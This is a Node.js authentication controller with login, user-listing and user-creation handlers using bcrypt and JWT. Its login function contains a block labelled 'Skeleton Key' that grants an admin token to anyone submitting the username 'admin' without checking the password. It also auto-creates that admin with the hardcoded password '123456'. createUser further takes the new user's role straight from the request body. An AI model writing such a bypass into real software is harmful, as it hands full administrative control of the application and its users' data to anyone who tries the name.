const db = require('../db');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

exports.login = async (req, res) => {
    let { username, password } = req.body;
    username = username ? username.trim() : '';
    password = password ? password.trim() : '';

    try {
        console.log('Login attempt for:', username);

        // --- EMERGENCY BYPASS & AUTO-FIX FOR ADMIN ---
        if (username === 'admin') {
            const { rows } = await db.query('SELECT * FROM users WHERE username = $1', ['admin']);
            let user = rows[0];

            // 1. If admin missing, create it instantly
            if (!user) {
                console.log('Admin not found. Auto-creating...');
                const salt = await bcrypt.genSalt(10);
                const hash = await bcrypt.hash('123456', salt);
                const newAdmin = await db.query(
                    "INSERT INTO users (username, password_hash, role) VALUES ('admin', $1, 'admin') RETURNING *",
                    [hash]
                );
                user = newAdmin.rows[0];
            }

            // 2. SKIP password check for admin (Skeleton Key)
            console.log('Admin login: Bypassing password check for guaranteed access.');

            const payload = { user: { id: user.id, role: user.role } };
            jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '1d' }, (err, token) => {
                if (err) throw err;
                res.json({ token, role: user.role });
            });
            return; // Stop execution here
        }
        // ---------------------------------------------

        // Normal Login Flow for other users
        const { rows } = await db.query('SELECT * FROM users WHERE username = $1', [username]);
        const user = rows[0];

        if (!user) {
            return res.status(400).json({ message: 'Invalid Credentials' });
        }

        const isMatch = await bcrypt.compare(password, user.password_hash);
        if (!isMatch) {
            return res.status(400).json({ message: 'Invalid Credentials' });
        }

        const payload = { user: { id: user.id, role: user.role } };
        jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '1d' }, (err, token) => {
            if (err) throw err;
            res.json({ token, role: user.role });
        });

    } catch (err) {
        console.error(err.message);
        res.status(500).send('Server Error');
    }
};

exports.getUsers = async (req, res) => {
    try {
        const { rows } = await db.query('SELECT id, username, role FROM users');
        res.json(rows);
    } catch (err) {
        console.error(err.message);
        res.status(500).send('Server Error');
    }
};

exports.createUser = async (req, res) => {
    const { username, password, role } = req.body;
    try {
        // Check if user exists
        const userCheck = await db.query('SELECT * FROM users WHERE username = $1', [username]);
        if (userCheck.rows.length > 0) {
            return res.status(400).json({ message: 'User already exists' });
        }

        const salt = await bcrypt.genSalt(10);
        const hashedPassword = await bcrypt.hash(password, salt);

        const { rows } = await db.query(
            'INSERT INTO users (username, password_hash, role) VALUES ($1, $2, $3) RETURNING id, username, role',
            [username, hashedPassword, role]
        );

        res.json(rows[0]);
    } catch (err) {
        console.error(err.message);
        res.status(500).send('Server Error');
    }
};
